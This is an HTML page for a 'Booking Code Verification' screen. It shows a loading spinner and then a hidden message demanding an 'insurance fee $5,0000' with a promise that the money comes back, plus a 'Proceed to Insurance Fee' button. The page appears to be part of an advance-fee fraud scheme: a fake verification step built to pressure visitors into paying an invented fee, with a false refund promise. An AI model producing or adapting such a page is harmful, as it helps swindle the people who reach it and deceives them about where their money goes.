<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Booking Code Verification</title>
  <link rel="stylesheet" href="css/style.css" />
  <style>
    .centered-loader {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: var(--bg);
      color: var(--text);
    }
    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #eb656e;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 32px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .verify-message {
      font-size: 1.2rem;
      font-weight: 500;
      margin-bottom: 18px;
      text-align: center;
    }
    .verify-warning {
      color: #f59e0b;
      font-size: 1rem;
      margin-bottom: 10px;
      text-align: center;
    }
    .proceed-btn {
      background: var(--grad);
      color: #fff;
      font-weight: 600;
      padding: 10px 28px;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      margin-top: 18px;
      box-shadow: 0 1px 4px 0 rgba(80,80,120,0.07);
      transition: background 0.2s;
      display: none;
    }
    .proceed-btn.visible { display: inline-block; }
  </style>
</head>
<body>
  <div class="centered-loader">
    <div class="loader"></div>
    <div class="verify-message">Checking your booking code status...</div>
    <div class="verify-warning" id="verifyWarning" style="display:none;">Pay insurance fee $5,0000 to complete your booking code.
        <br>Get your money back after the booking code is completed.
        <br>Please wait or contact support.</div>
    <button class="proceed-btn" id="proceedBtn">Proceed to Insurance Fee</button>
  </div>
  <script src="js/config.js"></script>
  <script src="js/api.js"></script>
  <script src="js/verify-booking.js"></script>
</body>
</html>
